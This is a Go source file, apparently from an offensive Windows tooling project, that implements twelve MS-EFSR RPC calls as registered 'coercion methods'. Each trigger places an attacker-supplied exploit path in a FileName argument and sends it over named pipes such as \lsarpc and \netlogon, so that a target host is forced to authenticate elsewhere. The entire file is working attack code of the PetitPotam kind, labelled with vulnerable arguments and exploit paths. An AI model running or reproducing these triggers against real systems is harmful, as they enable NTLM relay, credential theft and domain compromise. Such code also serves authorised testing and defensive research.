package methods

import (
	efsrpc "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	msefsr "github.com/TheManticoreProject/Manticore/windows/protocols/ms-efsr"
)

const efsrpcAltUUID = "df1941c5-fe89-4e79-bf10-463657acf44d"

func efsrpcSyntaxes() []syntax.SyntaxID {
	candidates := []syntax.SyntaxID{efsrpc.SyntaxID()}
	if uuid, err := guid.FromFormatD(efsrpcAltUUID); err == nil {
		candidates = append(candidates, syntax.SyntaxID{UUID: *uuid, MajorVersion: 1, MinorVersion: 0})
	}
	return candidates
}

func efsrpcAccess() []Access {
	syntaxes := efsrpcSyntaxes()
	return []Access{
		{Transport: TransportNamedPipe, Pipe: efsrpc.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportNamedPipe, Pipe: `\lsarpc`, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportNamedPipe, Pipe: `\samr`, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportNamedPipe, Pipe: `\lsass`, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportNamedPipe, Pipe: `\netlogon`, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
	}
}

// --- Op 0: EfsRpcOpenFileRaw ---

type efsRpcOpenFileRawRequest struct {
	FileName ndr.WSTR
	Flags    int32
}

func (*efsRpcOpenFileRawRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcOpenFileRaw }

type efsRpcOpenFileRawResponse struct {
	HContext msefsr.PEXIMPORT_CONTEXT_HANDLE
	Status   ndr.DWORD `ndr:"retval"`
}

// --- Op 4: EfsRpcEncryptFileSrv ---

type efsRpcEncryptFileSrvRequest struct {
	FileName ndr.WSTR
}

func (*efsRpcEncryptFileSrvRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcEncryptFileSrv }

type efsRpcEncryptFileSrvResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 5: EfsRpcDecryptFileSrv ---

type efsRpcDecryptFileSrvRequest struct {
	FileName ndr.WSTR
	OpenFlag ndr.DWORD
}

func (*efsRpcDecryptFileSrvRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcDecryptFileSrv }

type efsRpcDecryptFileSrvResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 6: EfsRpcQueryUsersOnFile ---

type efsRpcQueryUsersOnFileRequest struct {
	FileName ndr.WSTR
}

func (*efsRpcQueryUsersOnFileRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcQueryUsersOnFile }

type efsRpcQueryUsersOnFileResponse struct {
	Users  *msefsr.ENCRYPTION_CERTIFICATE_HASH_LIST `ndr:"unique"`
	Status ndr.DWORD                                `ndr:"retval"`
}

// --- Op 7: EfsRpcQueryRecoveryAgents ---

type efsRpcQueryRecoveryAgentsRequest struct {
	FileName ndr.WSTR
}

func (*efsRpcQueryRecoveryAgentsRequest) Opnum() uint16 {
	return efsrpc.OpnumEfsRpcQueryRecoveryAgents
}

type efsRpcQueryRecoveryAgentsResponse struct {
	RecoveryAgents *msefsr.ENCRYPTION_CERTIFICATE_HASH_LIST `ndr:"unique"`
	Status         ndr.DWORD                                `ndr:"retval"`
}

// --- Op 8: EfsRpcRemoveUsersFromFile ---

type efsRpcRemoveUsersFromFileRequest struct {
	FileName ndr.WSTR
	Users    msefsr.ENCRYPTION_CERTIFICATE_HASH_LIST
}

func (*efsRpcRemoveUsersFromFileRequest) Opnum() uint16 {
	return efsrpc.OpnumEfsRpcRemoveUsersFromFile
}

type efsRpcRemoveUsersFromFileResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 9: EfsRpcAddUsersToFile ---

type efsRpcAddUsersToFileRequest struct {
	FileName               ndr.WSTR
	EncryptionCertificates msefsr.ENCRYPTION_CERTIFICATE_LIST
}

func (*efsRpcAddUsersToFileRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcAddUsersToFile }

type efsRpcAddUsersToFileResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 12: EfsRpcFileKeyInfo ---

type efsRpcFileKeyInfoRequest struct {
	FileName  ndr.WSTR
	InfoClass ndr.DWORD
}

func (*efsRpcFileKeyInfoRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcFileKeyInfo }

type efsRpcFileKeyInfoResponse struct {
	KeyInfo *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	Status  ndr.DWORD            `ndr:"retval"`
}

// --- Op 13: EfsRpcDuplicateEncryptionInfoFile ---

type efsRpcDuplicateEncryptionInfoFileRequest struct {
	SrcFileName           ndr.WSTR
	DestFileName          ndr.WSTR
	DwCreationDisposition ndr.DWORD
	DwAttributes          ndr.DWORD
	RelativeSD            *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	BInheritHandle        ndr.BOOL
}

func (*efsRpcDuplicateEncryptionInfoFileRequest) Opnum() uint16 {
	return efsrpc.OpnumEfsRpcDuplicateEncryptionInfoFile
}

type efsRpcDuplicateEncryptionInfoFileResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 15: EfsRpcAddUsersToFileEx ---

type efsRpcAddUsersToFileExRequest struct {
	DwFlags                ndr.DWORD
	Reserved               *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	FileName               ndr.WSTR
	EncryptionCertificates msefsr.ENCRYPTION_CERTIFICATE_LIST
}

func (*efsRpcAddUsersToFileExRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcAddUsersToFileEx }

type efsRpcAddUsersToFileExResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 16: EfsRpcFileKeyInfoEx ---

type efsRpcFileKeyInfoExRequest struct {
	DwFileKeyInfoFlags ndr.DWORD
	Reserved           *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	FileName           ndr.WSTR
	InfoClass          ndr.DWORD
}

func (*efsRpcFileKeyInfoExRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcFileKeyInfoEx }

type efsRpcFileKeyInfoExResponse struct {
	KeyInfo *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	Status  ndr.DWORD            `ndr:"retval"`
}

// --- Op 21: EfsRpcEncryptFileExSrv ---

type efsRpcEncryptFileExSrvRequest struct {
	FileName            ndr.WSTR
	ProtectorDescriptor *ndr.WSTR `ndr:"unique"`
	Flags               ndr.DWORD
}

func (*efsRpcEncryptFileExSrvRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcEncryptFileExSrv }

type efsRpcEncryptFileExSrvResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// registerEFSR registers all 12 MS-EFSR coercion methods.
func registerEFSR(r *Registry) {
	access := efsrpcAccess()
	paths := smbPathsWithHTTP()

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcOpenFileRaw", Opnum: efsrpc.OpnumEfsRpcOpenFileRaw,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcOpenFileRawRequest{FileName: ndr.WSTR(exploitPath), Flags: 0}
			var resp efsRpcOpenFileRawResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcEncryptFileSrv", Opnum: efsrpc.OpnumEfsRpcEncryptFileSrv,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcEncryptFileSrvRequest{FileName: ndr.WSTR(exploitPath)}
			var resp efsRpcEncryptFileSrvResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcDecryptFileSrv", Opnum: efsrpc.OpnumEfsRpcDecryptFileSrv,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcDecryptFileSrvRequest{FileName: ndr.WSTR(exploitPath), OpenFlag: 0}
			var resp efsRpcDecryptFileSrvResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcQueryUsersOnFile", Opnum: efsrpc.OpnumEfsRpcQueryUsersOnFile,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcQueryUsersOnFileRequest{FileName: ndr.WSTR(exploitPath)}
			var resp efsRpcQueryUsersOnFileResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcQueryRecoveryAgents", Opnum: efsrpc.OpnumEfsRpcQueryRecoveryAgents,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcQueryRecoveryAgentsRequest{FileName: ndr.WSTR(exploitPath)}
			var resp efsRpcQueryRecoveryAgentsResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcRemoveUsersFromFile", Opnum: efsrpc.OpnumEfsRpcRemoveUsersFromFile,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcRemoveUsersFromFileRequest{
				FileName: ndr.WSTR(exploitPath),
				Users:    msefsr.ENCRYPTION_CERTIFICATE_HASH_LIST{},
			}
			var resp efsRpcRemoveUsersFromFileResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcAddUsersToFile", Opnum: efsrpc.OpnumEfsRpcAddUsersToFile,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcAddUsersToFileRequest{
				FileName:               ndr.WSTR(exploitPath),
				EncryptionCertificates: msefsr.ENCRYPTION_CERTIFICATE_LIST{},
			}
			var resp efsRpcAddUsersToFileResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcFileKeyInfo", Opnum: efsrpc.OpnumEfsRpcFileKeyInfo,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcFileKeyInfoRequest{FileName: ndr.WSTR(exploitPath), InfoClass: 0}
			var resp efsRpcFileKeyInfoResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcDuplicateEncryptionInfoFile", Opnum: efsrpc.OpnumEfsRpcDuplicateEncryptionInfoFile,
		VulnerableArgs: []string{"SrcFileName", "DestFileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcDuplicateEncryptionInfoFileRequest{
				SrcFileName:  ndr.WSTR(exploitPath),
				DestFileName: ndr.WSTR(exploitPath),
			}
			var resp efsRpcDuplicateEncryptionInfoFileResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcAddUsersToFileEx", Opnum: efsrpc.OpnumEfsRpcAddUsersToFileEx,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcAddUsersToFileExRequest{
				DwFlags:                0x00000002,
				FileName:               ndr.WSTR(exploitPath),
				EncryptionCertificates: msefsr.ENCRYPTION_CERTIFICATE_LIST{},
			}
			var resp efsRpcAddUsersToFileExResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcFileKeyInfoEx", Opnum: efsrpc.OpnumEfsRpcFileKeyInfoEx,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcFileKeyInfoExRequest{
				FileName:  ndr.WSTR(exploitPath),
				InfoClass: 1,
			}
			var resp efsRpcFileKeyInfoExResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-EFSR", ProtocolLong: "Encrypting File System Remote",
		Function: "EfsRpcEncryptFileExSrv", Opnum: efsrpc.OpnumEfsRpcEncryptFileExSrv,
		VulnerableArgs: []string{"FileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &efsRpcEncryptFileExSrvRequest{FileName: ndr.WSTR(exploitPath)}
			var resp efsRpcEncryptFileExSrvResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
